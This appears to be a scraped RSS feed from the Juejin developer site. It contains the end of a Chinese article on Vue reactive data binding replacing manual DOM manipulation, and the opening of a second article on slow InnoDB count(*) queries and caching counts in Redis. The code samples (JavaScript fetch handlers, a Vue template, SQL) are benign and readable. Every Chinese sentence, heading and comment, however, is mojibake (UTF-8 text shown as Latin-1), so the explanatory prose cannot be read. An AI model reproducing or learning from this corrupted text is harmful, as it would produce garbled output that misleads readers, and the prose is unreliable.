<h3 data-id="heading-9">ä½†è¿™ç§æ–¹æ³•å¹¶éå®Œç¾ï¼Œä»ç„¶å­˜åœ¨ç—›ç‚¹ï¼šæ‰‹åŠ¨æ“ä½œ DOM ç¹çä¸”æ˜“é”™</h3>
<p>ä¸¾ä¸ªâ€œèƒ¶æ°´ä»£ç ç¾éš¾â€çš„ä¾‹å­ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ç”¨æˆ·ç‚¹å‡»â€œåˆ é™¤â€</span>
button.<span class="hljs-property">onclick</span> = <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/users/<span class="hljs-subst">${id}</span>`</span>, { <span class="hljs-attr">method</span>: <span class="hljs-string">'DELETE'</span> })
    .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// ä»åˆ—è¡¨ä¸­ç§»é™¤å…ƒç´ </span>
      li.<span class="hljs-title function_">remove</span>();
      <span class="hljs-comment">// æ›´æ–°</span>
      countSpan.<span class="hljs-property">textContent</span> = --totalCount;
      <span class="hljs-comment">// å¦‚æœåˆ—è¡¨ç©ºäº†ï¼Œæ˜¾ç¤ºâ€œæš‚æ— æ•°æ®â€</span>
      <span class="hljs-keyword">if</span> (totalCount === <span class="hljs-number">0</span>) emptyMsg.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'block'</span>;
      <span class="hljs-comment">// å¯èƒ½è¿˜è¦å‘åŸ‹ç‚¹ã€æ›´æ–°ç¼“å­˜ã€é€šçŸ¥å…¶ä»–ç»„ä»¶...</span>
    });
};
</code></pre>
<p><strong>è§†å›¾æ›´æ–°é€»è¾‘æ•£è½åœ¨å„å¤„ï¼Œéš¾ä»¥ç»´æŠ¤ï¼Œææ˜“å‡ºé”™</strong>ï¼Œåˆ é™¤æ•°æ®è¦ï¼š</p>
<ul>
<li>æ‰¾åˆ°Â <code>&lt;tr&gt;</code>Â å¹¶åˆ é™¤</li>
<li>æ›´æ–°</li>
<li>æ‰¾åˆ°ç©ºçŠ¶æ€æç¤ºå¹¶æ˜¾ç¤º</li>
<li>å¯èƒ½è¿˜è¦ï¼šæ›´æ–°ä¾§è¾¹æ ç»Ÿè®¡ã€åˆ·æ–°åˆ†é¡µã€æ¸…é™¤æœç´¢é«˜äº®â€¦â€¦</li>
</ul>
<p>æ¯æ¬¡ UI å˜åŒ–éƒ½è¦æ‰‹åŠ¨æ‰¾ä¸€å † DOM èŠ‚ç‚¹å»ä¿®æ”¹ï¼Œå¹¶ä¸”éš¾ä»¥å¤ç”¨ã€‚</p>
<p>è¿™æ—¶æœŸçš„å‰ç«¯ç¨‹åºå‘˜å†…å¿ƒéƒ½æ†‹ç€ä¸€å¥è¯ï¼š<strong>æˆ‘ä¸æƒ³å†å†™ <code>document.getElementById</code> äº†ï¼</strong></p>
<p><strong>AJAX è®©ç½‘é¡µæ´»äº†è¿‡æ¥ï¼Œä½†ä¹Ÿè®©å‰ç«¯å¼€å‘è€…é™·å…¥äº†æ–°çš„åœ°ç‹±ï¼ˆDOMï¼‰â€”â€”ç›´åˆ°æ¡†æ¶é™ä¸´</strong></p>
<h2 data-id="heading-10">æ—¶ä»£ä¸‰ï¼šé©å‘½ï¼å“åº”å¼æ•°æ®é©±åŠ¨ç•Œé¢çš„å´›èµ·</h2>
<h3 data-id="heading-11">æ ¸å¿ƒæ€æƒ³ï¼š</h3>
<blockquote>
<p><strong>â€œä½ åªç®¡æ”¹æ•°æ®ï¼Œç•Œé¢è‡ªåŠ¨æ›´æ–°ã€‚â€</strong></p>
</blockquote>
<h4 data-id="heading-12">å…³é”®æŠ€æœ¯ï¼š<code>ref</code> ä¸å“åº”å¼ç³»ç»Ÿ</h4>
<ul>
<li><code>ref()</code> å°†æ™®é€šå€¼åŒ…è£…æˆ<strong>å“åº”å¼å¯¹è±¡</strong></li>
<li>æ¨¡æ¿ä¸­é€šè¿‡ <code>{{ }}</code> æˆ– <code>v-for</code> <strong>å£°æ˜å¼ç»‘å®šæ•°æ®</strong></li>
<li>æ•°æ®å˜åŒ–ä¼šè‡ªåŠ¨è§¦å‘è§†å›¾æ›´æ–°ï¼ˆæ— éœ€æ‰‹åŠ¨ DOM æ“ä½œï¼‰</li>
</ul>
<h4 data-id="heading-13">å“åº”å¼ï¼ˆä»¥ Vue ä¸ºä¾‹ï¼‰</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>ID<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Name<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Email<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span>
      <span class="hljs-comment">&lt;!-- éå†æ•°æ®æ¸²æŸ“åˆ°ç•Œé¢ --&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"user in users"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"user.id"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>{{ user.id }}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>{{ user.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>{{ user.email }}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<ul>
<li><strong><code>v-for</code></strong>ï¼šå£°æ˜éå†Â <code>users</code>Â æ•°ç»„</li>
<li><strong><code>{{ }}</code></strong> ï¼šæ˜¾ç¤ºÂ <code>user</code>Â çš„æŸä¸ªå±æ€§</li>
<li><strong><code>:key</code></strong>ï¼šå¸®åŠ© Vue é«˜æ•ˆè¿½è¸ªåˆ—è¡¨å˜åŒ–ï¼ˆæ€§èƒ½ä¼˜åŒ–ï¼‰</li>
</ul>
<p>ä½†æ˜¯å…³é”®åœ¨äºï¼š<strong>æˆ‘æ²¡æœ‰å†™ä»»ä½• DOM æ“ä½œä»£ç ï¼</strong></p>
<blockquote>
<p>åªæ˜¯åœ¨â€œæè¿° UI åº”è¯¥æ˜¯ä»€ä¹ˆæ ·å­â€ï¼Œè€Œä¸æ˜¯â€œæ€ä¹ˆå»ä¿®æ”¹ DOMâ€ã€‚</p>
</blockquote>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { 
  ref,
  onMounted <span class="hljs-comment">// æŒ‚è½½ä¹‹åçš„ç”Ÿå‘½å‘¨æœŸ</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>; <span class="hljs-comment">// å“åº”å¼apiï¼ˆå°†æ•°æ®åŒ…è£…æˆå“åº”å¼å¯¹è±¡ï¼‰</span>

<span class="hljs-comment">// ç”¨ ref() å°†æ™®é€šæ•°ç»„åŒ…è£…æˆä¸€ä¸ª å“åº”å¼å¼•ç”¨å¯¹è±¡</span>
<span class="hljs-keyword">const</span> users = <span class="hljs-title function_">ref</span>([]);

<span class="hljs-comment">// onMountedï¼šç¡®ä¿ DOM å·²åˆ›å»ºåå†å‘èµ·è¯·æ±‚ï¼ˆé¿å…æ“ä½œä¸å­˜åœ¨çš„å…ƒç´ ï¼‰</span>
<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'é¡µé¢æŒ‚è½½å®Œæˆ'</span>);
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'http://localhost:3000/users'</span>)
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
      users.<span class="hljs-property">value</span> = data; <span class="hljs-comment">// åªä¿®æ”¹æ•°æ®</span>
    })
})

<span class="hljs-comment">// å®šæ—¶å™¨æ·»åŠ æ•°æ®</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
  users.<span class="hljs-property">value</span>.<span class="hljs-title function_">push</span>({
    <span class="hljs-attr">id</span>: <span class="hljs-string">'4'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'é’±å…­'</span>,
    <span class="hljs-attr">email</span>: <span class="hljs-string">'12313@qq.com'</span>
  })
}, <span class="hljs-number">3000</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>æ²¡æœ‰</strong>Â <code>innerHTML</code>ï¼
<strong>æ²¡æœ‰</strong>Â <code>createElement</code>ï¼
<strong>æ²¡æœ‰</strong>Â <code>getElementById</code>ï¼</p>
<p>å¹¶ä¸”<strong>æ‰€æœ‰ UI æ›´æ–°éƒ½æ˜¯æ•°æ®å˜åŒ–çš„è‡ªç„¶ç»“æœï¼Œæ— éœ€äººå·¥å¹²é¢„ï¼</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7ac30e0045a4b2f99e9dd988e2677ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LCO6KiA6KW_6KW_6YeM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766050097&amp;x-signature=BHXssd8XiktmvlBtQKBg8twswv8%3D" alt="2025-12-11.gif" loading="lazy"/></p>
<h2 data-id="heading-14">æ•´ä¸ªå†å²è¿›ç¨‹ï¼š</h2>





























<table><thead><tr><th>é˜¶æ®µ</th><th>å¼€å‘æ¨¡å¼</th><th>æ ¸å¿ƒå…³æ³¨ç‚¹</th><th>å¼€å‘ä½“éªŒ</th></tr></thead><tbody><tr><td>åç«¯æ¸²æŸ“</td><td>MVC</td><td>æ•°æ® â†’ æ¨¡æ¿ â†’ HTML</td><td>å‰ç«¯è¾¹ç¼˜åŒ–</td></tr><tr><td>å‰åç«¯åˆ†ç¦»</td><td>AJAX + DOM</td><td>æ‰‹åŠ¨åŒæ­¥æ•°æ®ä¸è§†å›¾</td><td>ç¹çã€æ˜“é”™</td></tr><tr><td><strong>å“åº”å¼æ¡†æ¶</strong></td><td><strong>æ•°æ®é©±åŠ¨</strong></td><td><strong>èšç„¦ä¸šåŠ¡é€»è¾‘</strong></td><td><strong>é«˜æ•ˆã€å£°æ˜å¼ã€æ„‰æ‚¦</strong></td></tr></tbody></table>
<p>è¿™æ®µçŸ­çŸ­çš„ Vue ä»£ç ï¼Œæµ“ç¼©äº†å‰ç«¯å¼€å‘åå¹´çš„æ¼”è¿›ï¼š</p>
<ul>
<li><strong>ä»â€œæ“ä½œ DOMâ€åˆ°â€œæè¿° UIâ€</strong></li>
<li><strong>ä»â€œåˆ†æ•£çŠ¶æ€â€åˆ°â€œå•ä¸€æ•°æ®æºâ€</strong></li>
<li><strong>ä»â€œæ˜“é”™èƒ¶æ°´â€åˆ°â€œè‡ªåŠ¨åŒæ­¥â€</strong></li>
</ul>
<p>å®ƒè®©å‰ç«¯å¼€å‘è€…ç»ˆäºè®¤è¯†åˆ°ä¸€ä¸ªæ–°çš„è‡ªå·±ï¼š<strong>å‰ç«¯ä¸å†åªæ˜¯â€œåˆ‡å›¾ä»”â€ï¼Œè€Œæ˜¯å¤æ‚åº”ç”¨çš„æ¶æ„è€…ä¸ä½“éªŒè®¾è®¡å¸ˆã€‚</strong>
è¿™ï¼Œå°±æ˜¯ <strong>å“åº”å¼æ•°æ®é©±åŠ¨ç•Œé¢</strong> çš„é©å‘½æ€§æ‰€åœ¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åŒäº‹å†™çš„count(*)æ€§èƒ½å¾ˆå·®ï¼Œå¦‚ä½•ä¼˜åŒ–ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7582406735387394054</link>    <guid>https://juejin.cn/post/7582406735387394054</guid>    <pubDate>2025-12-11T09:35:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582406735387394054" data-draft-id="7582406735387361286" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åŒäº‹å†™çš„count(*)æ€§èƒ½å¾ˆå·®ï¼Œå¦‚ä½•ä¼˜åŒ–ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-11T09:35:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‹ä¸‰è¯´æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/465848661970824"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åŒäº‹å†™çš„count(*)æ€§èƒ½å¾ˆå·®ï¼Œå¦‚ä½•ä¼˜åŒ–ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/465848661970824/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‹ä¸‰è¯´æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T09:35:53.000Z" title="Thu Dec 11 2025 09:35:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>æœ€è¿‘æˆ‘åœ¨å…¬å¸ä¼˜åŒ–è¿‡å‡ ä¸ªæ…¢æŸ¥è¯¢æ¥å£çš„æ€§èƒ½ï¼Œæ€»ç»“äº†ä¸€äº›å¿ƒå¾—ä½“ä¼šæ‹¿å‡ºæ¥è·Ÿå¤§å®¶ä¸€èµ·åˆ†äº«ä¸€ä¸‹ï¼Œå¸Œæœ›å¯¹ä½ ä¼šæœ‰æ‰€å¸®åŠ©ã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨çš„æ•°æ®åº“æ˜¯<code>Mysql8</code>ï¼Œä½¿ç”¨çš„å­˜å‚¨å¼•æ“æ˜¯<code>Innodb</code>ã€‚è¿™æ¬¡ä¼˜åŒ–é™¤äº†<code>ä¼˜åŒ–ç´¢å¼•</code>ä¹‹å¤–ï¼Œæ›´å¤šçš„æ˜¯åœ¨ä¼˜åŒ–<code>count(*)</code>ã€‚</p>
<p>é€šå¸¸æƒ…å†µä¸‹ï¼Œåˆ†é¡µæ¥å£ä¸€èˆ¬ä¼šæŸ¥è¯¢ä¸¤æ¬¡æ•°æ®åº“ï¼Œç¬¬ä¸€æ¬¡æ˜¯è·å–å…·ä½“æ•°æ®ï¼Œç¬¬äºŒæ¬¡æ˜¯è·å–æ€»çš„è®°å½•è¡Œæ•°ï¼Œç„¶åæŠŠç»“æœæ•´åˆä¹‹åï¼Œå†è¿”å›ã€‚</p>
<p>æŸ¥è¯¢å…·ä½“æ•°æ®çš„sqlï¼Œæ¯”å¦‚æ˜¯è¿™æ ·çš„ï¼š`</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">select</span> id,name <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> limit <span class="hljs-number">20</span>;
</code></pre>
<p>å®ƒæ²¡æœ‰æ€§èƒ½é—®é¢˜ã€‚</p>
<p>ä½†å¦å¤–ä¸€æ¡ä½¿ç”¨count(*)æŸ¥è¯¢æ€»è®°å½•è¡Œæ•°çš„sqlï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;
</code></pre>
<p>å´å­˜åœ¨æ€§èƒ½å·®çš„é—®é¢˜ã€‚</p>
<p>ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ç§æƒ…å†µå‘¢ï¼Ÿ</p>
<p><a href="https://link.juejin.cn/?target=http%3A%2F%2Fsusan.net.cn%2Fproject" title="https://link.juejin.cn/?target=http%3A%2F%2Fsusan.net.cn%2Fproject" target="_blank">æœ€è¿‘å‡†å¤‡é¢è¯•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸ªå®è—ç½‘ç«™ï¼ˆJavaçªå‡»é˜Ÿï¼‰ï¼šwww.susan.net.cnï¼Œé‡Œé¢ï¼šé¢è¯•å…«è‚¡æ–‡ã€åœºæ™¯è®¾è®¡é¢˜ã€Springæºç è§£è¯»ã€8ä¸ªé¡¹ç›®å®æˆ˜ã€å·¥ä½œå†…æ¨ä»€ä¹ˆéƒ½æœ‰</a>ã€‚</p>
<h2 data-id="heading-1">1 count(*)ä¸ºä»€ä¹ˆæ€§èƒ½å·®ï¼Ÿ</h2>
<p>åœ¨Mysqlä¸­ï¼Œ<code>count(*)</code>çš„ä½œç”¨æ˜¯ç»Ÿè®¡è¡¨ä¸­è®°å½•çš„æ€»è¡Œæ•°ã€‚</p>
<p>è€Œ<code>count(*)</code>çš„æ€§èƒ½è·Ÿå­˜å‚¨å¼•æ“æœ‰ç›´æ¥å…³ç³»ï¼Œå¹¶éæ‰€æœ‰çš„å­˜å‚¨å¼•æ“ï¼Œ<code>count(*)</code>çš„æ€§èƒ½éƒ½å¾ˆå·®ã€‚</p>
<p>åœ¨Mysqlä¸­ä½¿ç”¨æœ€å¤šçš„å­˜å‚¨å¼•æ“æ˜¯ï¼š<code>innodb</code>å’Œ<code>myisam</code>ã€‚</p>
<p>åœ¨myisamä¸­ä¼šæŠŠæ€»è¡Œæ•°ä¿å­˜åˆ°ç£ç›˜ä¸Šï¼Œä½¿ç”¨count(*)æ—¶ï¼Œåªéœ€è¦è¿”å›é‚£ä¸ªæ•°æ®å³å¯ï¼Œæ— éœ€é¢å¤–çš„è®¡ç®—ï¼Œæ‰€ä»¥æ‰§è¡Œæ•ˆç‡å¾ˆé«˜ã€‚</p>
<p>è€Œinnodbåˆ™ä¸åŒï¼Œç”±äºå®ƒæ”¯æŒäº‹åŠ¡ï¼Œæœ‰<code>MVCC</code>ï¼ˆå³å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼‰çš„å­˜åœ¨ï¼Œåœ¨åŒä¸€ä¸ªæ—¶é—´ç‚¹çš„ä¸åŒäº‹åŠ¡ä¸­ï¼ŒåŒä¸€æ¡æŸ¥è¯¢sqlï¼Œè¿”å›çš„è®°å½•è¡Œæ•°å¯èƒ½æ˜¯ä¸ç¡®å®šçš„ã€‚</p>
<p>åœ¨innodbä½¿ç”¨count(*)æ—¶ï¼Œéœ€è¦ä»å­˜å‚¨å¼•æ“ä¸­ä¸€è¡Œè¡Œçš„è¯»å‡ºæ•°æ®ï¼Œç„¶åç´¯åŠ èµ·æ¥ï¼Œæ‰€ä»¥æ‰§è¡Œæ•ˆç‡å¾ˆä½ã€‚</p>
<p>å¦‚æœè¡¨ä¸­æ•°æ®é‡å°è¿˜å¥½ï¼Œä¸€æ—¦è¡¨ä¸­æ•°æ®é‡å¾ˆå¤§ï¼Œinnodbå­˜å‚¨å¼•æ“ä½¿ç”¨count(*)ç»Ÿè®¡æ•°æ®æ—¶ï¼Œæ€§èƒ½å°±ä¼šå¾ˆå·®ã€‚</p>
<h2 data-id="heading-2">2 å¦‚ä½•ä¼˜åŒ–count(*)æ€§èƒ½ï¼Ÿ</h2>
<p>ä»ä¸Šé¢å¾—çŸ¥ï¼Œæ—¢ç„¶<code>count(*)</code>å­˜åœ¨æ€§èƒ½é—®é¢˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•ä¼˜åŒ–å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬å¯ä»¥ä»ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ç€æ‰‹ã€‚</p>
<h3 data-id="heading-3">2.1 å¢åŠ redisç¼“å­˜</h3>
<p>å¯¹äºç®€å•çš„count(*)ï¼Œæ¯”å¦‚ï¼šç»Ÿè®¡æµè§ˆæ€»æ¬¡æ•°æˆ–è€…æµè§ˆæ€»äººæ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†æ¥å£ä½¿ç”¨redisç¼“å­˜èµ·æ¥ï¼Œæ²¡å¿…è¦å®æ—¶ç»Ÿè®¡ã€‚</p>
<p>å½“ç”¨æˆ·æ‰“å¼€æŒ‡å®šé¡µé¢æ—¶ï¼Œåœ¨ç¼“å­˜ä¸­æ¯æ¬¡éƒ½è®¾ç½®æˆcount = count+1å³å¯ã€‚</p>
<p>ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®é¡µé¢æ—¶ï¼Œredisä¸­çš„countå€¼è®¾ç½®æˆ1ã€‚ç”¨æˆ·ä»¥åæ¯è®¿é—®ä¸€æ¬¡é¡µé¢ï¼Œéƒ½è®©countåŠ 1ï¼Œæœ€åé‡æ–°è®¾ç½®åˆ°redisä¸­ã€‚
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/344fc89d30b34cb9b715162341423236~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766050553&amp;x-signature=YisW%2FiNNgdZnR3xEhB0IfeJ5FZs%3D" alt="" loading="lazy"/>
è¿™æ ·åœ¨éœ€è¦å±•ç¤ºæ•°é‡çš„åœ°æ–¹ï¼Œä»redisä¸­æŸ¥å‡ºcountå€¼è¿”å›å³å¯ã€‚</p>
<p>è¯¥åœºæ™¯æ— éœ€ä»æ•°æ®åŸ‹ç‚¹è¡¨ä¸­ä½¿ç”¨count(*)å®æ—¶ç»Ÿè®¡æ•°æ®ï¼Œæ€§èƒ½å°†ä¼šå¾—åˆ°æå¤§çš„æå‡ã€‚</p>
<p>ä¸è¿‡åœ¨é«˜å¹¶å‘çš„æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šå­˜åœ¨ç¼“å­˜å’Œæ•°æ®åº“çš„æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ã€‚</p>
